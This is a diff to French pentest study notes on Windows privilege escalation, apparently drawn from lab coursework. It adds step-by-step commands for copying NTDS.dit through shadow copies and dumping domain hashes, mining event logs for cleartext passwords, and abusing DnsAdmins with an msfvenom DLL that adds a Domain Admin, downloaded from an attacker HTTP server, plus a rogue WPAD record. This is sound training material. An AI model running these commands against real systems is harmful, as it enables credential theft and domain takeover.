@@ -293,6 +293,8 @@ Cela signifie que **tous les utilisateurs** peuvent écrire dedans → escalade 
 - Si un service tourne avec `SeImpersonatePrivilege` → testez les *Potato exploits*.
 
 --- 
+# Windows User Privileges
+---
 
 # Windows Privileges Overview
 
@@ -351,7 +353,7 @@ L’exploitation consiste à **abuser de privilèges ou groupes** pour détourne
 
 ---
 
-## SeImpersonate & SeAssignPrimaryToken
+# SeImpersonate & SeAssignPrimaryToken
 
 **Ce que c’est**  
 - Les tokens de processus décrivent le contexte de sécurité (qui exécute quoi).  
@@ -388,7 +390,7 @@ L’exploitation consiste à **abuser de privilèges ou groupes** pour détourne
 
 ---
 
-## SeDebugPrivilege
+# SeDebugPrivilege
 
 **C’est quoi ?**  
 - `SeDebugPrivilege` permet d’ouvrir/inspecter n’importe quel processus pour le débogage.  
@@ -434,7 +436,7 @@ L’exploitation consiste à **abuser de privilèges ou groupes** pour détourne
 
 --- 
 
-## SeTakeOwnershipPrivilege
+# SeTakeOwnershipPrivilege
 
 `SeTakeOwnershipPrivilege` permet à un utilisateur de **prendre possession** d’un objet sécurisable (fichiers NTFS, clés de registre, services, objets AD, imprimantes, etc.). 
 Concrètement il donne le droit `WRITE_OWNER` sur l’objet — l’utilisateur peut en changer le propriétaire et ensuite modifier les ACL pour se donner l’accès. 
@@ -488,11 +490,272 @@ On peut utiliser des scripts PowerShell publics pour activer les privilèges du 
 
 ---
 
+# Windows Group Privileges
 
+---
 
+# Windows Built-in Groups
 
+Comme indiqué dans la section *Windows Privileges Overview*, les serveurs Windows (et en particulier les Domain Controllers) incluent plusieurs groupes intégrés fournis avec le système ou ajoutés lors de l'installation du rôle Active Directory. 
+Beaucoup de ces groupes confèrent des privilèges particuliers à leurs membres ; certains de ces privilèges peuvent être exploités pour une élévation de privilèges sur un serveur ou un DC. 
+Il est important de comprendre l'impact de l'appartenance à chacun de ces groupes et d'inclure la liste des membres lors d'un audit.
 
+Pour nos besoins, nous nous concentrons sur les groupes suivants :
 
+- `Backup Operators`  
+- `Event Log Readers`  
+- `DnsAdmins`  
+- `Hyper-V Administrators`  
+- `Print Operators`  
+- `Server Operators`
+  
+## Backup Operators
+
+Après avoir obtenu un accès, utilisez `whoami /groups` pour vérifier vos appartenances aux groupes. L'appartenance à `Backup Operators` donne les privilèges `SeBackupPrivilege` et `SeRestorePrivilege`. Le privilège `SeBackupPrivilege` permet d'énumérer et de copier des fichiers même sans ACE explicite pour l'utilisateur actif, mais il faut utiliser les mécanismes de sauvegarde (par ex. `FILE_FLAG_BACKUP_SEMANTICS`) plutôt que la commande `copy` classique.
+
+### Import helper modules
+Pour utiliser un PoC qui exploite ces privilèges, importez les modules PowerShell d'assistance :
+`Import-Module .\SeBackupPrivilegeUtils.dll`  
+`Import-Module .\SeBackupPrivilegeCmdLets.dll`
+
+### Verify privilege
+Vérifiez l'état du privilège :
+`whoami /priv`  
+ou
+`Get-SeBackupPrivilege`
+
+Si `SeBackupPrivilege` est `Disabled`, activez-le :
+`Set-SeBackupPrivilege`  
+Puis confirmez :
+`Get-SeBackupPrivilege`  
+`whoami /priv`
+
+Une fois activé, il devient possible de lire ou copier des fichiers sans ACL explicite.
+
+### Copy a protected file
+Exemple : un fichier protégé que l'on ne peut pas lire avec `cat` :
+`cat 'C:\Confidential\2021 Contract.txt'` → accès refusé
+
+Avec l'outil adapté :
+`Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`  
+Puis :
+`cat .\Contract.txt` → affiche le contenu copié
+
+## Attacking a Domain Controller — Copying `NTDS.dit`
+
+Les `Backup Operators` peuvent se connecter localement sur un DC et créer des shadow copies (VSS) pour accéder à des fichiers verrouillés comme `NTDS.dit`.
+
+### Create and expose a shadow copy with DiskShadow
+Exécutez `diskshadow.exe` et la séquence suivante :
+`set verbose on`  
+`set metadata C:\Windows\Temp\meta.cab`  
+`set context clientaccessible`  
+`set context persistent`  
+`begin backup`  
+`add volume C: alias cdrive`  
+`create`  
+`expose %cdrive% E:`  
+`end backup`  
+`exit`
+
+Listez le lecteur exposé :
+`dir E:`
+
+### Copy `ntds.dit`
+Copiez le fichier verrouillé via la cmdlet de backup :
+`Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
+
+## Backing up SAM and SYSTEM hives
+
+Sauvegardez les ruches de registre pour extraction hors-ligne :
+`reg save HKLM\SYSTEM SYSTEM.SAV`  
+`reg save HKLM\SAM SAM.SAV`
+
+Ces fichiers, associés à `ntds.dit`, permettent d'extraire les hachages hors ligne.
+
+## Extracting credentials from `ntds.dit`
+
+Avec DSInternals (PowerShell) :
+`Import-Module .\DSInternals.psd1`  
+`$key = Get-BootKey -SystemHivePath .\SYSTEM`  
+`Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key`
+
+Cela retournera les métadonnées et le `NTHash` du compte.
+
+### Using `secretsdump.py` (Impacket) offline
+Exemple :
+`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
+
+La commande retournera les hachages des comptes du domaine pour une utilisation en pass-the-hash ou en cassage hors-ligne.
+
+## Robocopy alternative
+
+L'utilitaire intégré `robocopy` peut aussi copier en mode sauvegarde (`/B`) :
+`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
+
+Cela permet de copier des fichiers verrouillés depuis la shadow copy sans outils externes.
+
+## Notes & cautions
+
+- Si un ACE explicite de type *deny* existe pour l'utilisateur ou un groupe auquel il appartient, cela peut empêcher l'accès même avec `SeBackupPrivilege`.  
+- Extraire `ntds.dit` et les ruches de registre est bruyant et potentiellement destructeur ; obtenir l'autorisation et documenter toutes les modifications.  
+- Dans le rapport, fournissez la liste des membres des groupes concernés et des recommandations pour réduire les appartenances inutiles.
+
+---
+
+# Event Log Readers
+
+Les entrées d'audit (par ex. la création de processus et la ligne de commande associée) sont très précieuses pour la défense : elles permettent de retracer les commandes exécutées sur un poste et d'alimenter un SIEM ou un moteur de recherche (ElasticSearch, etc.). Si l'audit de la création de processus et des lignes de commande est activé, les informations se retrouvent dans le journal de sécurité Windows sous l'ID d'événement `4688`.
+
+Les attaquants exécutent souvent des commandes reconnaissables après un accès initial (`tasklist`, `ipconfig`, `systeminfo`, `dir`, `net view`, `net use`, etc.). La présence de ces événements dans les logs permet de détecter et d'alerter sur des comportements suspects. Certaines organisations vont plus loin en bloquant l'exécution de commandes via AppLocker.
+
+Administrateurs et utilisateurs placés dans le groupe `Event Log Readers` peuvent lire certains journaux d'événements locaux sans être administrateurs (utile pour déléguer la consultation des logs sans donner de droits d'admin).
+
+## Confirming Group Membership
+
+Vérifiez les membres du groupe local :
+`net localgroup "Event Log Readers"`
+
+Exemple de sortie :
+`logger` (membre listé)
+
+## Searching Security Logs with `wevtutil`
+
+Depuis la ligne de commande, il est possible d'interroger le journal de sécurité. Exemple pour trouver des lignes de commande contenant `/user` (attention aux mots de passe en clair dans les commandes) :
+`wevtutil qe Security /rd:true /f:text | Select-String "/user"`
+
+Vous pouvez aussi préciser des informations d'authentification pour `wevtutil` :
+`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`
+
+## Searching Security Logs with `Get-WinEvent`
+
+Avec PowerShell, filtrez les événements 4688 et extrayez la ligne de commande (ici on cherche `/user` dans la ligne de commande) :
+`Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
+
+**Important** : la lecture du journal `Security` via `Get-WinEvent` nécessite souvent des droits administrateur ou des permissions spécifiques sur la clé de registre `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. L'appartenance seule au groupe `Event Log Readers` n'est pas toujours suffisante pour interroger ce journal.
+
+## Other Useful Logs
+
+- Le journal *PowerShell Operational* peut contenir des informations sensibles (script block logging, module logging) et **est souvent accessible aux utilisateurs non-privés** — il vaut donc la peine d’être parcouru.
+- Vérifiez aussi les journaux d’application et système selon la configuration d’audit locale.
+
+## Remarques pratiques
+
+- Recherchez en priorité les événements 4688 (process creation) et les valeurs `CommandLine` si l'audit est activé.  
+- Recherchez les occurrences de mots-clés indiquant des credentials en clair (`/user:`, `-Password`, `-p`, etc.).  
+- Documentez toute découverte (commande complète, timestamp, PID, utilisateur) dans le rapport — ces logs constituent des preuves et sont utiles pour la remédiation.
+
+---
+
+# DnsAdmins
+
+Les membres du groupe `DnsAdmins` ont accès à la configuration du service DNS du domaine. Ce service, exécuté sous le compte `NT AUTHORITY\SYSTEM`, peut charger des **plugins DLL personnalisés** sans vérification de chemin via la clé de registre `ServerLevelPluginDll`. 
+Cela signifie qu’un membre du groupe peut **charger une DLL malveillante** et l’exécuter avec les privilèges SYSTEM, permettant ainsi une **élévation de privilèges sur un Domain Controller**.
+
+## Leveraging DnsAdmins Access
+
+### Generating a Malicious DLL
+
+On peut générer une DLL malveillante qui, par exemple, ajoute un utilisateur au groupe `Domain Admins` :
+`msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`
+
+### Starting Local HTTP Server
+
+On démarre un petit serveur pour héberger la DLL :
+`python3 -m http.server 7777`
+
+### Downloading File to Target
+
+On télécharge ensuite la DLL sur la machine cible :
+`wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`
+
+## Loading the DLL
+
+### As Non-Privileged User
+
+Un utilisateur standard ne pourra pas charger la DLL :
+`dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`  
+→ `ERROR_ACCESS_DENIED`
+
+### As Member of DnsAdmins
+
+Confirmez d’abord que l’utilisateur est membre du groupe :
+`Get-ADGroupMember -Identity DnsAdmins`
+
+Puis chargez la DLL :
+`dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`  
+→ `Command completed successfully.`
+
+La clé de registre `ServerLevelPluginDll` est alors mise à jour.  
+La DLL sera chargée **lors du prochain redémarrage du service DNS**.
+
+## Restarting the DNS Service
+
+Un membre de `DnsAdmins` ne peut pas forcément redémarrer le service, mais si les permissions le permettent, on peut vérifier cela :
+
+### Finding User SID
+`wmic useraccount where name="netadm" get sid`
+
+### Checking Permissions on DNS Service
+`sc.exe sdshow DNS`  
+Si le SID de l’utilisateur a les droits `RPWP`, il peut **stopper et démarrer** le service.
+
+### Stopping and Starting DNS
+`sc stop dns`  
+`sc start dns`
+
+Si l’attaque réussit, la DLL s’exécute et ajoute l’utilisateur au groupe Domain Admins.
+
+### Confirming Group Membership
+`net group "Domain Admins" /dom`  
+→ l’utilisateur `netadm` est maintenant membre du groupe.
+
+## Cleaning Up
+
+**Attention :** modifier la configuration DNS d’un Domain Controller est une action à fort risque. Elle doit toujours être effectuée avec l’accord explicite du client.
+
+### Confirming Registry Key Added
+`reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
+
+La valeur `ServerLevelPluginDll` doit pointer vers la DLL malveillante.
+
+### Deleting Registry Key
+`reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`
+
+### Starting the DNS Service Again
+`sc.exe start dns`
+
+### Checking Service Status
+`sc query dns`  
+→ L’état doit être `RUNNING`.
+
+Une fois le service redémarré sans la DLL, le fonctionnement DNS redevient normal.
+
+## Using `mimilib.dll`
+
+Une autre méthode consiste à utiliser `mimilib.dll` (de Mimikatz) pour exécuter du code à chaque requête DNS.  
+Il suffit de modifier la fonction `kdns_DnsPluginQuery()` pour exécuter une commande (par ex. un reverse shell) avant compilation.
+
+## Creating a WPAD Record
+
+Une autre exploitation du groupe `DnsAdmins` consiste à créer un **enregistrement DNS WPAD** afin de détourner le trafic réseau via un proxy contrôlé par l’attaquant.  
+Par défaut, WPAD et ISATAP sont bloqués dans la *Global Query Block List*. En désactivant ce blocage, l’attaque devient possible.
+
+### Disabling the Global Query Block List
+`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`
+
+### Adding a WPAD Record
+`Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`
+
+Ainsi, toutes les machines cherchant à découvrir un proxy via WPAD pointeront vers la machine de l’attaquant, permettant la capture ou la redirection de trafic (par ex. avec `Responder` ou `Inveigh`).
+
+## Points clés
+
+- Le groupe `DnsAdmins` permet de **charger une DLL exécutée en SYSTEM** via `ServerLevelPluginDll`.  
+- Il est également possible d’**exploiter les enregistrements DNS** (comme WPAD) pour des attaques réseau.  
+- Toute manipulation du service DNS doit être faite avec précaution — elle peut **impacter tout l’environnement AD**.
+
+---
 
 
 
